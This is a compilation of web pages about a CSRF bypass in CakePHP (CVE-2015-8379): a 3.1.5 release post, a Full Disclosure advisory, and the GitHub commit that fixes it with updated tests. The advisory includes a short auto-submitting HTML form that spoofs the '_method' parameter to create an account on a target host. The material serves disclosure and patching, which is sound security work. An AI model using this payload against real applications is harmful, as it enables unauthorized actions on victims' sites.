[![CakePHP](../../../_static/logo-cake.png)](https://cakephp.org)

* Documentation
  + [Book](https://book.cakephp.org)
  + [API](https://api.cakephp.org)
  + [Videos](https://cakephp.org/documentation/videos)
  + [Reporting Security Issues](https://github.com/cakephp/cakephp#security)
  + [Privacy Policy](https://cakephp.org/privacy)
  + [Logos & Trademarks](https://cakephp.org/pages/trademark)
* [Business Solutions](https://cakephp.org/business-solutions)
* [Swag](https://swag.cakephp.org)
* [Road Trip](https://cakephp.org/pages/road_trip)
* [Team](https://cakephp.org/pages/team)
* Community
  + Community
  + [Get Involved](https://cakephp.org/pages/get-involved)
  + [Issues (GitHub)](https://github.com/cakephp/cakephp/issues)
  + [Bakery](https://bakery.cakephp.org)
  + [Featured Resources](https://github.com/FriendsOfCake/awesome-cakephp)
  + [Training](https://training.cakephp.org/)
  + [Meetups](https://cakephp.org/pages/meetups)
  + [My CakePHP](https://my.cakephp.org/login)
  + [CakeFest](https://cakefest.org)
  + [Newsletter](https://cakephp.org/pages/newsletter)
  + [Linkedin](https://www.linkedin.com/groups/4623165)
  + [YouTube](https://www.youtube.com/user/CakePHP)
  + [Facebook](https://www.facebook.com/CakePHP/)
  + [Twitter](https://twitter.com/cakephp)
  + [Mastodon](https://phpc.social/%40cakephp)
  + Help & Support
  + [Forum](https://discourse.cakephp.org)
  + [Stack Overflow](https://stackoverflow.com/tags/cakephp)
  + [Slack](https://slack-invite.cakephp.org/)
  + [Paid Support](https://www.cakedc.com/)

[![CakePHP](../../../_static/logo-cake.png)](https://cakephp.org)

# e Bakery The Official CakePHP Blog

**Navigation**

×
####

[###### Improve This Page](https://github.com/cakephp/bakery/edit/master/2015/11/29/cakephp_315_released.rst)

November 29, 2015

# CakePHP 3.1.5 Released

The CakePHP core team is happy to announce the immediate availability of CakePHP 3.1.5. This is a maintenance release for the 3.1 branch that fixes several community reported issues.

## Bugfixes

You can expect the following changes in 3.1.5. See the [changelog](https://cakephp.org/changelogs/3.1.5) for every commit.

* Collection::toArray() now drops the keys when dealing with RecursiveIterator. This makes the collection features easier to reason about as they generally do what people have been expecting.
* Improved API documentation.
* ResultSet::isEmpty() no longer consumes records on buffered iterators that had not already been iterated.
* The ORM no longer emits invalid queries when eager loading associations using the subquery strategy, and using an ORDER BY clause. Fields used in ORDER BY clauses are also included in the selected fields.
* Error handling is now compatible with PHP7. This removes the last known compatibility error with PHP7.
* BelongsToMany associations use bindingKey correctly now.
* Integer marshalling correctly accepts negative values now.
* When executing Shell ‘main’ method the current command name is set to ‘main’.
* spellcheck is now a standard attribute. Unlike most HTML5 attributes, spellcheck requires ‘true’ and ‘false’ values, which means it cannot be a minimized attribute.
* CSRF validation is applied to all HTTP methods that are not ‘GET’, ‘OPTIONS’ or ‘HEAD’. This prevents invalid HTTP methods from bypassing CSRF validation.
* RouterBuilder::resources() correctly inflects the object id when using 'inflect' => 'dasherize' and nested resources.
* TimeHelper::format() no longer shifts string datetimes to the supplied timezone before formatting.
* Shell::createFile() no longer converts \n to \r\n silently when running on windows.

## Minor Enhancements

* RouteBuilder::addExtension() was added. This method lets you incrementally add extensions instead of replacing the connected extensions.
* The options passed to Table::save(), and HasMany/BelongsToMany link/unlink/replace methods are being passed through to the internal Table::save/delete() calls.
* The CsrfComponent now supports an httpOnly option. Enabling this option makes the CSRF cookie inaccessible to client side scripting.

As always, a huge thanks to all the community members that helped make this release happen by reporting issues and sending pull requests.

Download a [packaged release on github](https://github.com/cakephp/cakephp/releases).

Posted by markstory

Filed under:
[release](../../../categories/release.html), [news](../../../categories/news.html)

Tags:
[release](../../../tags/release.html), [news](../../../tags/news.html)

# Recent Posts

* [CakePHP 5.1.5](../../../2025/01/16/cakephp_515.html)
* [CakePHP 4.5.9](../../../2025/01/04/cakephp_459.html)
* [CakePHP 5.1.4](../../../2024/12/12/cakephp_514.html)
* [CakePHP 4.5.8](../../../2024/11/24/cakephp_458.html)
* [CakePHP 5.1.2](../../../2024/11/09/cakephp_512.html)
* [CakePHP 5.1.1](../../../2024/10/03/cakephp_511.html)
* [CakePHP 4.5.7](../../../2024/09/20/cakephp_457.html)
* [CakePHP 5.1.0 Released](../../../2024/09/13/cakephp_510.html)
* [CakePHP 5.0.11](../../../2024/09/12/cakephp_5011.html)
* [CakePHP 5.1.0-RC2 Released](../../../2024/08/07/cakephp_510RC2.html)

# Categories

* [articles](../../../categories/articles.html) (113)
* [behaviors](../../../categories/behaviors.html) (3)
* [case\_studies](../../../categories/case_studies.html) (1)
* [code](../../../categories/code.html) (5)
* [components](../../../categories/components.html) (9)
* [general\_interest](../../../categories/general_interest.html) (3)
* [helpers](../../../categories/helpers.html) (12)
* [models](../../../categories/models.html) (2)
* [news](../../../categories/news.html) (430)
* [plugins](../../../categories/plugins.html) (32)
* [release](../../../categories/release.html) (329)
* [security](../../../categories/security.html) (17)
* [snippets](../../../categories/snippets.html) (9)
* [tutorials](../../../categories/tutorials.html) (8)

[![openHub](../../../_static/open-hub.svg)](https://www.openhub.net/p/cakephp)
[![pingping.io](../../../_static/pingping.png)](https://www.pingping.io/)

[![Linode](../../../_static/linode.png)](https://www.linode.com/)

* [Business Solutions](https://cakephp.org/business-solutions)
* [Showcase](https://cakephp.org/showcase)

* Documentation
* [Book](https://book.cakephp.org)
* [API](https://api.cakephp.org)
* [Videos](https://cakephp.org/documentation/videos)
* [Reporting Security Issues](https://github.com/cakephp/cakephp#security)
* [Privacy Policy](https://cakephp.org/privacy)
* [Logos & Trademarks](https://cakephp.org/pages/trademark)

* Community
* [Get Involved](https://cakephp.org/pages/get-involved)
* [Issues (GitHub)](https://github.com/cakephp/cakephp/issues)
* [Bakery](https://bakery.cakephp.org)
* [Featured Resources](https://github.com/FriendsOfCake/awesome-cakephp)
* [Training](https://training.cakephp.org/)
* [Meetups](https://cakephp.org/pages/meetups)
* [My CakePHP](https://my.cakephp.org/login)
* [CakeFest](https://cakefest.org)
* [Newsletter](https://cakephp.org/pages/newsletter)
* [Linkedin](https://www.linkedin.com/groups/4623165)
* [YouTube](https://www.youtube.com/user/CakePHP)
* [Facebook](https://www.facebook.com/CakePHP/)
* [Twitter](https://twitter.com/cakephp)
* [Mastodon](https://phpc.social/%40cakephp)

* Help & Support
* [Forum](https://discourse.cakephp.org)
* [Stack Overflow](https://stackoverflow.com/tags/cakephp)
* [Slack](https://slack-invite.cakephp.org/)
* [Paid Support](https://www.cakedc.com/)

[u](https://cakefoundation.org)

Copyright © Cake Software Foundation, Inc.
Created using [Sphinx](https://www.sphinx-doc.org/) 1.7.0.



=== Content from seclists.org_b29075bd_20250125_063108.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](41)
[By Date](date.html#42)
[![Next](/images/right-icon-16x16.png)](43)

[![Previous](/images/left-icon-16x16.png)](41)
[By Thread](index.html#42)
[![Next](/images/right-icon-16x16.png)](43)

![](/shared/images/nst-icons.svg#search)

# [KIS-2016-01] CakePHP <= 3.2.0 "\_method" CSRF Protection Bypass Vulnerability

---

*From*: Egidio Romano <research () karmainsecurity com>

*Date*: Fri, 15 Jan 2016 20:15:25 +0100

---

```
---------------------------------------------------------------
CakePHP <= 3.2.0 "_method" CSRF Protection Bypass Vulnerability
---------------------------------------------------------------

[-] Software Link:

<http://cakephp.org>

[-] Affected Versions:

Version 3.2.0 RC1 and prior 3.x versions.
Version 2.8.0 RC1 and prior 2.x versions.

[-] Vulnerability Description:

CakePHP provides some built-in security features including CSRF and Form Tampering protection.
Under certain circumstances it might be possible to bypass such security checks, since they are
performed only when the HTTP request is e.g. POST or PUT. CakePHP’s Router class uses a number
of different indicators to detect the HTTP method being used, like the "_method" POST parameter
and the "X_HTTP_METHOD_OVERRIDE" and "REQUEST_METHOD" headers. By abusing this behavior an
attacker might be able to carry out CSRF attacks against CakePHP applications which do not
check the HTTP method being used before executing side-effects. This is possible by overriding
the HTTP method with a web page like this:

<html>
<body>
<form action="http://[HOST]/user/add"; method="POST">
<input name="_method" type="hidden" value="CSRF" />
<input name="user" type="hidden" value="hacker" />
<input name="password" type="hidden" value="pwd" />
</form>
<script>document.forms[0].submit()</script>
</body>
</html>

[-] Solution:

No official solution is currently available. The vendor updated the official documentation
stating that developers should always check the HTTP method before executing side-effects.

NOTE: version 3.1.5 includes a bugfix for this issue stating "CSRF validation is applied to
all HTTP methods that are not ‘GET’, ‘OPTIONS’ or ‘HEAD’. This prevents invalid HTTP methods
from bypassing CSRF validation.", however this is a partial fix which does not solve the
vulnerability, because the bypass might still work by using one of the unprotected HTTP methods.

[-] Disclosure Timeline:

[10/11/2015] - Vendor notified
[26/11/2015] - Vendor tried to mitigate the issue with the following commit: <https://git.io/vzcda>
[01/12/2015] - Vendor response stating this issue has been addressed in version 3.1.5 and the documentation has been
updated
[01/12/2015] - CVE number requested
[01/12/2015] - CVE number assigned
[12/01/2016] - Public disclosure

[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2015-8379 to this vulnerability.

[-] Credits:

Vulnerability discovered by Egidio Romano of Minded Security.

[-] Original Advisory:

<http://karmainsecurity.com/KIS-2016-01>

[-] Other References:

<http://blog.mindedsecurity.com/2016/01/request-parameter-method-may-lead-to.html>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](41)
[By Date](date.html#42)
[![Next](/images/right-icon-16x16.png)](43)

[![Previous](/images/left-icon-16x16.png)](41)
[By Thread](index.html#42)
[![Next](/images/right-icon-16x16.png)](43)

### Current thread:

* **[KIS-2016-01] CakePHP <= 3.2.0 "\_method" CSRF Protection Bypass Vulnerability** *Egidio Romano (Jan 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_cd169883_20250125_063107.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_30e2e5f7_20250125_063109.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcakephp%2Fcakephp%2Fcommit%2F0f818a23a876c01429196bf7623e1e94a50230f0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcakephp%2Fcakephp%2Fcommit%2F0f818a23a876c01429196bf7623e1e94a50230f0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=cakephp%2Fcakephp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cakephp](/cakephp)
/
**[cakephp](/cakephp/cakephp)**
Public

* [Notifications](/login?return_to=%2Fcakephp%2Fcakephp) You must be signed in to change notification settings
* [Fork
  3.4k](/login?return_to=%2Fcakephp%2Fcakephp)
* [Star
   8.7k](/login?return_to=%2Fcakephp%2Fcakephp)

* [Code](/cakephp/cakephp)
* [Issues
  59](/cakephp/cakephp/issues)
* [Pull requests
  15](/cakephp/cakephp/pulls)
* [Actions](/cakephp/cakephp/actions)
* [Projects
  0](/cakephp/cakephp/projects)
* [Wiki](/cakephp/cakephp/wiki)
* [Security](/cakephp/cakephp/security)
* [Insights](/cakephp/cakephp/pulse)

Additional navigation options

* [Code](/cakephp/cakephp)
* [Issues](/cakephp/cakephp/issues)
* [Pull requests](/cakephp/cakephp/pulls)
* [Actions](/cakephp/cakephp/actions)
* [Projects](/cakephp/cakephp/projects)
* [Wiki](/cakephp/cakephp/wiki)
* [Security](/cakephp/cakephp/security)
* [Insights](/cakephp/cakephp/pulse)

## Commit

[Permalink](/cakephp/cakephp/commit/0f818a23a876c01429196bf7623e1e94a50230f0)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Only allow GET, HEAD, OPTIONS to not have CSRF tokens.

[Browse files](/cakephp/cakephp/tree/0f818a23a876c01429196bf7623e1e94a50230f0)
Browse the repository at this point in the history

```
This covers cases where bad guys make up fake HTTP methods to trick CSRF
validation.

Update test cases to not muck about in $_SERVER too.
```

* Loading branch information

[![@markstory](https://avatars.githubusercontent.com/u/24086?s=40&v=4)](/markstory)

[markstory](/cakephp/cakephp/commits?author=markstory "View all commits by markstory")
committed
Nov 26, 2015

1 parent
[f7f5e21](/cakephp/cakephp/commit/f7f5e21d80e1087b5aeac381b6dfcac287d6f59f)

commit 0f818a2

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**35 additions**
and
**27 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/Controller/Component

  + src/Controller/Component/CsrfComponent.php
    [CsrfComponent.php](#diff-39d623766257ccf4958d437806d831cd9ca896090e173253d4f2dc14acb5a2d0)
* tests/TestCase/Controller/Component

  + tests/TestCase/Controller/Component/CsrfComponentTest.php
    [CsrfComponentTest.php](#diff-7a446908f458a79995f28547606e0783f6f943bdd45c1c58900787ece7504d12)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[src/Controller/Component/CsrfComponent.php](#diff-39d623766257ccf4958d437806d831cd9ca896090e173253d4f2dc14acb5a2d0 "src/Controller/Component/CsrfComponent.php")

Show comments

[View file](/cakephp/cakephp/blob/0f818a23a876c01429196bf7623e1e94a50230f0/src/Controller/Component/CsrfComponent.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -94,7 +94,7 @@ public function startup(Event $event) |
|  |  | if ($request->is('get') && $cookieData === null) { |
|  |  | $this->\_setCookie($request, $response); |
|  |  | } |
|  |  | if ($request->is(['patch', 'put', 'post', 'delete'])) { |
|  |  | if (!$request->is(['head', 'get', 'options'])) { |
|  |  | $this->\_validateToken($request); |
|  |  | unset($request->data[$this->\_config['field']]); |
|  |  | } |
| Expand Down | |  |

60 changes: 34 additions & 26 deletions

60
[tests/TestCase/Controller/Component/CsrfComponentTest.php](#diff-7a446908f458a79995f28547606e0783f6f943bdd45c1c58900787ece7504d12 "tests/TestCase/Controller/Component/CsrfComponentTest.php")

Show comments

[View file](/cakephp/cakephp/blob/0f818a23a876c01429196bf7623e1e94a50230f0/tests/TestCase/Controller/Component/CsrfComponentTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -61,10 +61,11 @@ public function tearDown() |
|  |  | \*/ |
|  |  | public function testSettingCookie() |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = 'GET'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request(['webroot' => '/dir/']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => ['REQUEST\_METHOD' => 'GET'], |
|  |  | 'webroot' => '/dir/', |
|  |  | ]); |
|  |  | $controller->response = new Response(); |
|  |  |  |
|  |  | $event = new Event('Controller.startup', $controller); |
| Expand All | | @@ -87,7 +88,7 @@ public function testSettingCookie() |
|  |  | public static function httpMethodProvider() |
|  |  | { |
|  |  | return [ |
|  |  | ['PATCH'], ['PUT'], ['POST'], ['DELETE'] |
|  |  | ['PATCH'], ['PUT'], ['POST'], ['DELETE'], ['PURGE'], ['INVALIDMETHOD'] |
|  |  | ]; |
|  |  | } |
|  |  |  |
| Expand All | | @@ -100,11 +101,14 @@ public static function httpMethodProvider() |
|  |  | \*/ |
|  |  | public function testValidTokenInHeader($method) |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = $method; |
|  |  | $\_SERVER['HTTP\_X\_CSRF\_TOKEN'] = 'testing123'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request(['cookies' => ['csrfToken' => 'testing123']]); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => $method, |
|  |  | 'HTTP\_X\_CSRF\_TOKEN' => 'testing123', |
|  |  | ], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
|  |  | ]); |
|  |  | $controller->response = new Response(); |
|  |  |  |
|  |  | $event = new Event('Controller.startup', $controller); |
| Expand All | | @@ -122,11 +126,12 @@ public function testValidTokenInHeader($method) |
|  |  | \*/ |
|  |  | public function testInvalidTokenInHeader($method) |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = $method; |
|  |  | $\_SERVER['HTTP\_X\_CSRF\_TOKEN'] = 'nope'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => $method, |
|  |  | 'HTTP\_X\_CSRF\_TOKEN' => 'nope', |
|  |  | ], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
|  |  | ]); |
|  |  | $controller->response = new Response(); |
| Expand All | | @@ -144,10 +149,11 @@ public function testInvalidTokenInHeader($method) |
|  |  | \*/ |
|  |  | public function testValidTokenRequestData($method) |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = $method; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => $method, |
|  |  | ], |
|  |  | 'post' => ['\_csrfToken' => 'testing123'], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
|  |  | ]); |
| Expand All | | @@ -168,10 +174,11 @@ public function testValidTokenRequestData($method) |
|  |  | \*/ |
|  |  | public function testInvalidTokenRequestData($method) |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = $method; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => $method, |
|  |  | ], |
|  |  | 'post' => ['\_csrfToken' => 'nope'], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
|  |  | ]); |
| Expand All | | @@ -189,10 +196,11 @@ public function testInvalidTokenRequestData($method) |
|  |  | \*/ |
|  |  | public function testInvalidTokenRequestDataMissing() |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = 'POST'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => 'POST', |
|  |  | ], |
|  |  | 'post' => [], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
|  |  | ]); |
| Expand All | | @@ -211,10 +219,11 @@ public function testInvalidTokenRequestDataMissing() |
|  |  | \*/ |
|  |  | public function testInvalidTokenMissingCookie($method) |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = $method; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => [ |
|  |  | 'REQUEST\_METHOD' => $method |
|  |  | ], |
|  |  | 'post' => ['\_csrfToken' => 'could-be-valid'], |
|  |  | 'cookies' => [] |
|  |  | ]); |
| Expand All | | @@ -232,10 +241,9 @@ public function testInvalidTokenMissingCookie($method) |
|  |  | \*/ |
|  |  | public function testCsrfValidationSkipsRequestAction() |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = 'POST'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => ['REQUEST\_METHOD' => 'POST'], |
|  |  | 'params' => ['requested' => 1], |
|  |  | 'post' => ['\_csrfToken' => 'nope'], |
|  |  | 'cookies' => ['csrfToken' => 'testing123'] |
| Expand All | | @@ -256,10 +264,11 @@ public function testCsrfValidationSkipsRequestAction() |
|  |  | \*/ |
|  |  | public function testConfigurationCookieCreate() |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = 'GET'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request(['webroot' => '/dir/']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => ['REQUEST\_METHOD' => 'GET'], |
|  |  | 'webroot' => '/dir/' |
|  |  | ]); |
|  |  | $controller->response = new Response(); |
|  |  |  |
|  |  | $component = new CsrfComponent($this->registry, [ |
| Expand Down  Expand Up | | @@ -290,10 +299,9 @@ public function testConfigurationCookieCreate() |
|  |  | \*/ |
|  |  | public function testConfigurationValidate() |
|  |  | { |
|  |  | $\_SERVER['REQUEST\_METHOD'] = 'POST'; |
|  |  |  |
|  |  | $controller = $this->getMock('Cake\Controller\Controller', ['redirect']); |
|  |  | $controller->request = new Request([ |
|  |  | 'environment' => ['REQUEST\_METHOD' => 'POST'], |
|  |  | 'cookies' => ['csrfToken' => 'nope', 'token' => 'yes'], |
|  |  | 'post' => ['\_csrfToken' => 'no match', 'token' => 'yes'], |
|  |  | ]); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0f818a2`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcakephp%2Fcakephp%2Fcommit%2F0f818a23a876c01429196bf7623e1e94a50230f0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


